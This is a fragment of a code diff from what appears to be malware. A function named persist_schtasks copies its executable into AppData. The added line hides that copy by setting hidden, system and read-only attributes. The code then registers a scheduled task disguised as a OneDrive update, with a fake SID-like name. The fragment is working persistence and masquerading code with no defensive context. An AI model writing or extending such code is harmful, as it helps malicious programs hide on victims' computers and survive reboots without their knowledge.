@@ -137,6 +137,7 @@ def persist_schtasks():
         if exe_path != appdata_path:
             shutil.copy2(exe_path, appdata_path)
         exe_path = f'"{os.path.normpath(appdata_path)}"'
+        subprocess.run(f"attrib +h +s +r {exe_path}", shell=True)
         task_name = "OneDrive Standalone Update Task-S-1-5-18-18645234277racer1845-3677ree32sas42s428255-3946825334aexce4w29952-1001"
         xml = rf"""
 <?xml version="1.0" encoding="UTF-16"?>
